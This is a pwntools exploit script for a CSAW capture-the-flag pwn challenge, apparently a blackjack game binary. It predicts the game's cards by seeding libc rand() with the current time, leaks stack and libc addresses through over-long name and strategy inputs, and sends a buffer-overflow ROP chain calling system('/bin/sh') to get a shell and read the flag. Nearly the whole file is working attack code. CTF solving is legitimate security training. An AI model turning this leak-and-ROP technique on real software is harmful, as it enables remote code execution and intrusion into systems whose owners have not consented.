#!/usr/bin/python

from pwn import *
import sys
import ctypes
import time

remote_ip, port = 'when-to-h1t.chal.csaw.io', 5032
binary = './chal_patched'
brkpts = '''
b*$rebase(0x21e5)
c
'''

elf = ELF("chal_patched")
libc = ELF("./libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
# context.log_level = "debug"
# context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8, chr(0)))
    
def predict_card(dealer = False):
    global turn
    turn = 0
    if dealer:
        turn = 1
    card = clibc.rand() % 13 + 1
    if card < 10:
        return card
    elif card in [10, 12, 13]:
        return 10
    elif scores[0] > 10:
        return 1
    return 11

def decision():
    global scores, prev
    val = predict_card()
    if scores[0] + val == 21:
        scores[0] = 21
        return "w"
    elif (scores[0] + val) < 21:
        scores[0] += val
        return "h"
    else:
        prev = val
        return "s"

def first_turn():
    global scores
    scores[0] += predict_card()
    scores[1] += predict_card(True)

def stay():
    global wins, scores, prev, losses
    if prev != 0:
        scores[1] += prev
        prev = 0
    else:
        scores[1] += predict_card(True)
    if scores[1] <= 16:
        stay()
    elif scores[1] > 21:
        wins += 1
        return
    elif scores[1] > scores[0]:
        losses += 1
        return
    else:
        wins += 1
        return

def hit():
    global wins, scores, losses
    scores[1] += predict_card(True)
    if scores[1] > 21:
        wins += 1
        return
    elif scores[1] == 21:
        losses += 1
        return
    else:
        play_turn()

def play_turn():
    global wins, move_count
    outcome = decision()
    if outcome == "w":
        sla("stay.", "h")
    else:
        sla("stay.", outcome)
    # log.info("Current scores after {}: {}".format(outcome, scores))
    if outcome == "w":
        wins += 1
    elif outcome == "s":
        stay()
    elif outcome == "h":
        hit()

def calc_offset(stack_leak):
    rbp = stack_leak + 0xf88
    target = rbp & 0xff
    addr = stack_leak - 0x180
    offset = 0
    while (addr + offset) & 0xffff != target:
        offset += 8
    offset += 8
    return offset + 5

scores = [0, 0]
turn = 0
wins = 0
losses = 0
prev = 0
move_count = 0

clibc = ctypes.cdll.LoadLibrary("./libc.so.6")

def exploit(io):
    
    global wins, losses, scores, clibc
    
    # reu("[Note]")
    seed = int(time.time()) #+ 2
    clibc.srand(seed)
    
    for i in range(2):
        
        sa("(Y/N)\n", "Y")
        wins = 0
        losses = 0
        
        while wins < 37 and wins + losses < 50:
            scores = [0, 0]
            sla("Choice:", "1")
            first_turn()
            # log.info("Current scores: {}".format(scores))
            play_turn()
        
        if wins == 37:
            if wins + losses < 50:
                sla("Choice:", "3")
                
            if i == 0:
                sa("name?\n", "a"*0x28)
                reu("a"*0x28)
                stack_leak = uu64(re(6))
                # log.info("leak @ "+hex(stack_leak))
                
                sa("strategy?\n", "a"*0x31)
                
                # if i == 1:
                reu("Strategy==========")
                reu("a"*0x31)
                libc.address = uu64("\x00" + re(5)) - 0x1f2000
                # log.info("libc @ "+hex(libc.address))
                pop_rdi = libc.address + 0x23b6a
                binsh = next(libc.search("/bin/sh"))
                system = libc.symbols['system']

            ropchain = flat([
                pop_rdi, binsh,
                pop_rdi+1, system
            ])
            if i == 1:
                sa("name?\n", "aaaa")
                offset = calc_offset(stack_leak)
                payload = "a"*0x333 + "\x00"*offset + ropchain
                log.info("offset @ "+hex(stack_leak - 0x185 - 0x10 + offset))
                log.info("rbp @ "+hex(stack_leak + 0xf80))
                sa("strategy?\n", payload)
                
    sa("(Y/N)\n", "N")
    
    sl("cat flag")
    
    print(io.recv())
    io.interactive()
    

if __name__ == "__main__":
    while True:
        try:
            # io = remote(remote_ip, port)
            io = process(binary)
            exploit(io)
        except:
            io.close()
            continue
    